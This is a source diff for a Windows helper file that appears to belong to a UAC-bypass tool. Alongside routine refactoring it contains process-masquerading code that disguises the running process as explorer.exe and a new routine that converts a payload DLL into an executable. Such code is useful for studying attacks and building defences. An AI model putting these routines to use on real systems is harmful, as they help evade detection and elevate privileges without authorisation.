@@ -4,9 +4,9 @@
 *
 *  TITLE:       SUP.C
 *
-*  VERSION:     2.84
+*  VERSION:     2.85
 *
-*  DATE:        22 Nov 2017
+*  DATE:        01 Dec 2017
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -82,29 +82,27 @@ BOOLEAN supIsProcess32bit(
 *
 */
 BOOL supGetElevationType(
-    TOKEN_ELEVATION_TYPE *lpType
+    _Out_ TOKEN_ELEVATION_TYPE *lpType
 )
 {
     HANDLE hToken = NULL;
     NTSTATUS status;
     ULONG bytesRead = 0;
-
-    if (lpType == NULL) {
-        return FALSE;
-    }
-
+    TOKEN_ELEVATION_TYPE TokenType = TokenElevationTypeDefault;
+   
     status = NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
-    if (!NT_SUCCESS(status)) {
-        SetLastError(RtlNtStatusToDosError(status));
-        return FALSE;
-    }
+    if (NT_SUCCESS(status)) {
 
-    status = NtQueryInformationToken(hToken, TokenElevationType, lpType,
-        sizeof(TOKEN_ELEVATION_TYPE), &bytesRead);
+        status = NtQueryInformationToken(hToken, TokenElevationType, &TokenType,
+            sizeof(TOKEN_ELEVATION_TYPE), &bytesRead);
+
+        NtClose(hToken);
+    }
 
     SetLastError(RtlNtStatusToDosError(status));
 
-    NtClose(hToken);
+    if (lpType)
+        *lpType = TokenType;
 
     return (NT_SUCCESS(status));
 }
@@ -150,27 +148,22 @@ BOOL supWriteBufferToFile(
 )
 {
     HANDLE hFile;
-    DWORD bytesIO;
+    DWORD bytesIO = 0;
 
-    if (
-        (lpFileName == NULL) ||
-        (Buffer == NULL) ||
-        (BufferSize == 0)
-        )
-    {
+    if ((Buffer == NULL) || (BufferSize == 0))
         return FALSE;
-    }
 
     hFile = CreateFile(lpFileName,
         GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 
-    if (hFile == INVALID_HANDLE_VALUE) {
+    if (hFile != INVALID_HANDLE_VALUE) {
+        WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
+        CloseHandle(hFile);
+    }
+    else {
         supDebugPrint(TEXT("CreateFile"), GetLastError());
         return FALSE;
     }
-
-    WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
-    CloseHandle(hFile);
 
     return (bytesIO == BufferSize);
 }
@@ -184,8 +177,8 @@ BOOL supWriteBufferToFile(
 *
 */
 VOID supDebugPrint(
-    LPWSTR ApiName,
-    DWORD status
+    _In_ LPWSTR ApiName,
+    _In_ DWORD status
 )
 {
     LPWSTR lpBuffer;
@@ -209,6 +202,81 @@ VOID supDebugPrint(
     }
 
     SetLastError(status);
+}
+
+/*
+* supRegReadValue
+*
+* Purpose:
+*
+* Read given value to output buffer.
+* Returned Buffer must be released with RtlFreeHeap after use.
+*
+*/
+NTSTATUS supRegReadValue(
+    _In_ HANDLE hKey,
+    _In_ LPWSTR ValueName,
+    _In_ DWORD ValueType,
+    _Out_ PVOID *Buffer,
+    _Out_ ULONG *BufferSize,
+    _In_opt_ HANDLE hHeap
+)
+{
+    KEY_VALUE_PARTIAL_INFORMATION *kvpi;
+    UNICODE_STRING usName;
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+    ULONG Length = 0;
+    PVOID CopyBuffer = NULL;
+    HANDLE Heap;
+
+    *Buffer = NULL;
+    *BufferSize = 0;
+
+    usName.Buffer = NULL;
+    usName.Length = 0;
+    usName.MaximumLength = 0;
+
+
+    if (hHeap == NULL)
+        Heap = NtCurrentPeb()->ProcessHeap;
+    else
+        Heap = hHeap;
+
+    RtlInitUnicodeString(&usName, ValueName);
+    Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, NULL, 0, &Length);
+    if (Status == STATUS_BUFFER_TOO_SMALL) {
+
+        kvpi = RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, Length);
+        if (kvpi) {
+
+            Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, kvpi, Length, &Length);
+            if (NT_SUCCESS(Status)) {
+
+                if (kvpi->Type == ValueType) {
+
+                    CopyBuffer = RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, kvpi->DataLength);
+                    if (CopyBuffer) {
+                        RtlCopyMemory(CopyBuffer, kvpi->Data, kvpi->DataLength);
+                        *Buffer = CopyBuffer;
+                        *BufferSize = kvpi->DataLength;
+                        Status = STATUS_SUCCESS;
+                    }
+                    else {
+                        Status = STATUS_NO_MEMORY;
+                    }
+                }
+                else {
+                    Status = STATUS_OBJECT_TYPE_MISMATCH;
+                }
+            }
+            RtlFreeHeap(Heap, 0, kvpi);
+        }
+        else {
+            Status = STATUS_NO_MEMORY;
+        }
+    }
+
+    return Status;
 }
 
 /*
@@ -264,7 +332,6 @@ PBYTE supReadFileToBuffer(
         RtlFreeUnicodeString(&usName);
 
         if (!NT_SUCCESS(status)) {
-            supDebugPrint(TEXT("OpenDirectory"), RtlNtStatusToDosError(status));
             break;
         }
 
@@ -285,7 +352,6 @@ PBYTE supReadFileToBuffer(
         );
 
         if (!NT_SUCCESS(status)) {
-            supDebugPrint(TEXT("CreateFile"), RtlNtStatusToDosError(status));
             break;
         }
 
@@ -643,8 +709,8 @@ BOOL supSaveAkagiParameters(
 *
 */
 BOOL supSetParameter(
-    LPWSTR lpParameter,
-    DWORD cbParameter
+    _In_ LPWSTR lpParameter,
+    _In_ DWORD cbParameter
 )
 {
     BOOL bResult = FALSE;
@@ -788,13 +854,10 @@ BOOLEAN supSetCheckSumForMappedFile(
 *
 */
 VOID ucmShowMessage(
-    LPWSTR lpszMsg
+    _In_ LPWSTR lpszMsg
 )
 {
-    if (lpszMsg) {
-        MessageBoxW(GetDesktopWindow(),
-            lpszMsg, PROGRAMTITLE, MB_ICONINFORMATION);
-    }
+    MessageBoxW(GetDesktopWindow(), lpszMsg, PROGRAMTITLE, MB_ICONINFORMATION);
 }
 
 /*
@@ -806,7 +869,7 @@ VOID ucmShowMessage(
 *
 */
 INT ucmShowQuestion(
-    LPWSTR lpszMsg
+    _In_ LPWSTR lpszMsg
 )
 {
     return MessageBoxW(GetDesktopWindow(), lpszMsg, PROGRAMTITLE, MB_YESNO);
@@ -864,7 +927,7 @@ static LPWSTR g_lpszExplorer = NULL;
 VOID NTAPI supxLdrEnumModulesCallback(
     _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
     _In_ PVOID Context,
-    _In_ OUT BOOLEAN *StopEnumeration
+    _Inout_ BOOLEAN *StopEnumeration
 )
 {
     PPEB Peb = (PPEB)Context;
@@ -892,23 +955,25 @@ VOID supMasqueradeProcess(
     VOID
 )
 {
-    DWORD   cch;
+    NTSTATUS Status;
     PPEB    Peb = NtCurrentPeb();
-    SIZE_T  sz;
-    WCHAR   szBuffer[MAX_PATH * 2];
+    SIZE_T  RegionSize;
 
-    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-    cch = GetWindowsDirectory(szBuffer, MAX_PATH);
-    if ((cch != 0) && (cch < MAX_PATH)) {
+    g_lpszExplorer = NULL;
+    RegionSize = 0x1000;
 
-        _strcat(szBuffer, L"\\");
-        _strcat(szBuffer, EXPLORER_EXE);
+    Status = NtAllocateVirtualMemory(
+        NtCurrentProcess(),
+        &g_lpszExplorer,
+        0,
+        &RegionSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE);
 
-        g_lpszExplorer = NULL;
-        sz = 0x1000;
-        NtAllocateVirtualMemory(NtCurrentProcess(), &g_lpszExplorer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (NT_SUCCESS(Status)) {
         if (g_lpszExplorer) {
-            _strcpy(g_lpszExplorer, szBuffer);
+            _strcpy(g_lpszExplorer, g_ctx.szSystemRoot);
+            _strcat(g_lpszExplorer, EXPLORER_EXE);
 
             RtlEnterCriticalSection(Peb->FastPebLock);
 
@@ -931,9 +996,9 @@ VOID supMasqueradeProcess(
 *
 */
 DWORD supExpandEnvironmentStrings(
-    LPCWSTR lpSrc,
-    LPWSTR lpDst,
-    DWORD nSize
+    _In_ LPCWSTR lpSrc,
+    _In_ LPWSTR lpDst,
+    _In_ DWORD nSize
 )
 {
     NTSTATUS Status;
@@ -1013,7 +1078,7 @@ wchar_t *sxsFilePathNoSlash(
 VOID NTAPI sxsFindDllCallback(
     _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
     _In_ PVOID Context,
-    _In_ OUT BOOLEAN *StopEnumeration
+    _Inout_ BOOLEAN *StopEnumeration
 )
 {
     BOOL bCond = FALSE;
@@ -1054,10 +1119,10 @@ VOID NTAPI sxsFindDllCallback(
 *
 */
 PVOID supFindPattern(
-    CONST PBYTE Buffer,
-    SIZE_T BufferSize,
-    CONST PBYTE Pattern,
-    SIZE_T PatternSize
+    _In_ CONST PBYTE Buffer,
+    _In_ SIZE_T BufferSize,
+    _In_ CONST PBYTE Pattern,
+    _In_ SIZE_T PatternSize
 )
 {
     PBYTE	p = Buffer;
@@ -1091,8 +1156,8 @@ PVOID supFindPattern(
 *
 */
 PVOID supNativeGetProcAddress(
-    WCHAR *Module,
-    CHAR *Routine
+    _In_ WCHAR *Module,
+    _In_ CHAR *Routine
 )
 {
     PVOID            DllImageBase = NULL, ProcedureAddress = NULL;
@@ -1310,8 +1375,6 @@ BOOL supDeleteMountPoint(
         SetLastError(RtlNtStatusToDosError(status));
     }
 
-    supDebugPrint(L"supDeleteMountPoint", status);
-
     return NT_SUCCESS(status);
 }
 
@@ -1396,8 +1459,6 @@ BOOL supSetMountPoint(
         0);
 
     supHeapFree(Buffer);
-
-    supDebugPrint(L"supSetMountPoint", status);
 
     SetLastError(RtlNtStatusToDosError(status));
     return NT_SUCCESS(status);
@@ -1526,8 +1587,6 @@ BOOL supSetSymlink(
         0);
 
     supHeapFree(Buffer);
-
-    supDebugPrint(L"supSetSymlink", status);
 
     SetLastError(RtlNtStatusToDosError(status));
     return NT_SUCCESS(status);
@@ -1740,5 +1799,135 @@ BOOL supQueryNtBuildNumber(
         bResult = TRUE;
     }
     FreeLibrary(hModule);
+    return bResult;
+}
+
+/*
+* supConvertDllToExeSetNewEP
+*
+* Purpose:
+*
+* Convert payload dll to exe and set new entrypoint.
+*
+*/
+BOOL supConvertDllToExeSetNewEP(
+    _In_ PVOID pvImage,
+    _In_ ULONG dwImageSize,
+    _In_ LPSTR lpszEntryPoint
+)
+{
+    BOOL              bResult = FALSE;
+    PIMAGE_NT_HEADERS NtHeaders;
+    DWORD             DllVirtualSize;
+    PVOID             EntryPoint, DllBase;
+
+    NtHeaders = RtlImageNtHeader(pvImage);
+    if (NtHeaders != NULL) {
+
+        //
+        // Preload image.
+        //
+        DllVirtualSize = 0;
+        DllBase = PELoaderLoadImage(pvImage, &DllVirtualSize);
+        if (DllBase != NULL) {
+
+            //
+            // Get the new entrypoint from target export.
+            //
+            EntryPoint = PELoaderGetProcAddress(DllBase, lpszEntryPoint);
+            if (EntryPoint != NULL) {
+
+                //
+                // Set new entrypoint and recalculate checksum.
+                //
+                NtHeaders->OptionalHeader.AddressOfEntryPoint =
+                    (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);
+
+                NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;
+
+                NtHeaders->OptionalHeader.CheckSum =
+                    supCalculateCheckSumForMappedFile(pvImage, dwImageSize);
+
+                bResult = TRUE;
+            }
+
+            VirtualFree(DllBase, 0, MEM_RELEASE);
+        }
+    }
+    return bResult;
+}
+
+/*
+* supQuerySystemRoot
+*
+* Purpose:
+*
+* Query system root value from registry to the program global context.
+*
+*/
+BOOL supQuerySystemRoot(
+    VOID)
+{
+    BOOL                bCond = FALSE, bResult = FALSE, needBackslash = FALSE;
+    NTSTATUS            Status;
+    UNICODE_STRING      UString;
+    OBJECT_ATTRIBUTES   ObjectAttributes;
+
+    PWCHAR              lpData = NULL;
+    SIZE_T              ccm = 0, cch = 0;
+    HANDLE              hKey = NULL;
+
+    WCHAR               szBuffer[MAX_PATH];
+    WCHAR               szSystem32Prep[] = { L's', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', 0 };
+
+    ULONG               Length = 0, cbSystem32Prep = sizeof(szSystem32Prep) - sizeof(WCHAR);
+
+    do {
+        UString.Buffer = NULL;
+        _strcpy(szBuffer, T_REGISTRY_PREP);
+        _strcat(szBuffer, T_WINDOWS_CURRENT_VERSION);
+        RtlInitUnicodeString(&UString, szBuffer);
+
+        InitializeObjectAttributes(&ObjectAttributes, &UString, OBJ_CASE_INSENSITIVE, NULL, NULL);
+        Status = NtOpenKey(&hKey, KEY_READ, &ObjectAttributes);
+        if (!NT_SUCCESS(Status))
+            break;
+
+        Status = supRegReadValue(hKey, L"SystemRoot", REG_SZ, &lpData, &Length, g_ctx.ucmHeap);
+        if (!NT_SUCCESS(Status))
+            break;
+
+        ccm = Length / sizeof(WCHAR);
+        cch = ccm;
+        if (lpData[cch - 1] != L'\\') {
+            ccm++;
+            needBackslash = TRUE;
+        }
+        else {
+            needBackslash = FALSE;
+        }
+
+        ccm += (cbSystem32Prep / sizeof(WCHAR));
+
+        if (ccm >= MAX_PATH) {
+            SetLastError(ERROR_BUFFER_OVERFLOW);
+            break;
+        }
+
+        _strncpy(g_ctx.szSystemRoot, MAX_PATH, lpData, cch);
+        if (needBackslash) {
+            g_ctx.szSystemRoot[cch - 1] = L'\\';
+        }
+
+        _strcpy(g_ctx.szSystemDirectory, g_ctx.szSystemRoot);
+        _strcat(g_ctx.szSystemDirectory, szSystem32Prep);
+
+        bResult = TRUE;
+
+    } while (bCond);
+
+    if (hKey) NtClose(hKey);
+    if (lpData) supHeapFree(lpData);
+
     return bResult;
 }
